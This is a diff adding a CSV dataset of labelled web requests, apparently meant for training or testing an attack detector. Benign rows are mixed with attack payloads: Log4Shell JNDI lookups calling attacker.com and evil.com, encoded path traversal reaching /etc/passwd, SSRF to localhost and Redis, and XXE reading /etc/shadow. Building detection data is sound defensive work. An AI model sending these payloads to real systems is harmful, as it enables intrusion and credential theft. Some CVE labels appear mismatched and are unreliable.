@@ -1,0 +1,34 @@
+timestamp,attack_type,cve,cvss_score,severity,payload_snippet,label,status_code
+2026-05-21T12:06:42.804206,log4shell,CVE-2021-44228,10.0,CRITICAL,${j${::-n}di:ldap://attacker.com/a},1,N/A
+2026-05-21T12:06:47.060201,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:ldap://attacker.com/a},1,N/A
+2026-05-21T12:06:51.439672,log4shell,CVE-2021-44228,10.0,CRITICAL,${jndi:ldaps://evil.com:1389/Exploit},1,N/A
+2026-05-21T12:06:53.965346,benign,N/A,0,NONE,normal_data,0,201
+2026-05-21T12:06:56.545865,benign,N/A,0,NONE,normal_data,0,201
+2026-05-21T12:06:59.170192,benign,N/A,0,NONE,normal_products,0,N/A
+2026-05-21T12:07:02.245000,benign,N/A,0,NONE,normal_products,0,N/A
+2026-05-21T12:07:05.280594,benign,N/A,0,NONE,normal_users,0,N/A
+2026-05-21T12:07:06.525851,path_traversal,CVE-2019-18935,9.8,CRITICAL,%252e%252e%252f%252e%252e%252fetc%252fpasswd,1,N/A
+2026-05-21T12:07:06.754806,path_traversal,CVE-2019-18935,9.8,CRITICAL,..%252f..%252f..%252fetc%252fpasswd,1,N/A
+2026-05-21T12:07:09.216666,path_traversal,CVE-2021-41773,9.8,CRITICAL,/..%2F..%2F..%2Fetc%2Fpasswd,1,N/A
+2026-05-21T12:07:09.334937,path_traversal,CVE-2019-18935,9.8,CRITICAL,..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts,1,N/A
+2026-05-21T12:07:11.610406,benign,N/A,0,NONE,normal_orders,0,N/A
+2026-05-21T12:07:13.989157,benign,N/A,0,NONE,normal_products,0,N/A
+2026-05-21T12:07:16.796667,benign,N/A,0,NONE,normal_data,0,201
+2026-05-21T12:07:19.402570,benign,N/A,0,NONE,normal_data,0,201
+2026-05-21T12:07:22.169972,benign,N/A,0,NONE,normal_orders,0,N/A
+2026-05-21T12:07:24.819590,benign,N/A,0,NONE,normal_data,0,201
+2026-05-21T12:07:27.705546,benign,N/A,0,NONE,normal_data,0,201
+2026-05-21T12:07:30.099194,benign,N/A,0,NONE,normal_products,0,N/A
+2026-05-21T12:07:34.940797,ssrf,CVE-2019-11043,9.8,CRITICAL,gopher://127.0.0.1:6379/_PING,1,N/A
+2026-05-21T12:07:39.500142,ssrf,CVE-2021-22986,9.8,CRITICAL,http://localhost/admin,1,N/A
+2026-05-21T12:07:42.165508,benign,N/A,0,NONE,normal_data,0,201
+2026-05-21T12:07:45.292285,benign,N/A,0,NONE,normal_orders,0,N/A
+2026-05-21T12:07:47.772585,benign,N/A,0,NONE,normal_users,0,N/A
+2026-05-21T12:07:51.152641,xxe,CVE-2021-27065,7.8,HIGH,<?xml version='1.0'?><!DOCTYPE data [<!ENTITY file SYSTEM 'file:///etc/shadow'>]><data>&file;</data>,1,201
+2026-05-21T12:07:53.396254,xxe,CVE-2021-27065,7.8,HIGH,<?xml version='1.0'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>,1,201
+2026-05-21T12:07:55.863564,benign,N/A,0,NONE,normal_users,0,N/A
+2026-05-21T12:07:58.485904,benign,N/A,0,NONE,normal_orders,0,N/A
+2026-05-21T12:08:01.417670,benign,N/A,0,NONE,normal_users,0,N/A
+2026-05-21T12:08:04.344799,benign,N/A,0,NONE,normal_users,0,N/A
+2026-05-21T12:08:07.337635,benign,N/A,0,NONE,normal_orders,0,N/A
+2026-05-21T12:08:10.186844,benign,N/A,0,NONE,normal_products,0,N/A
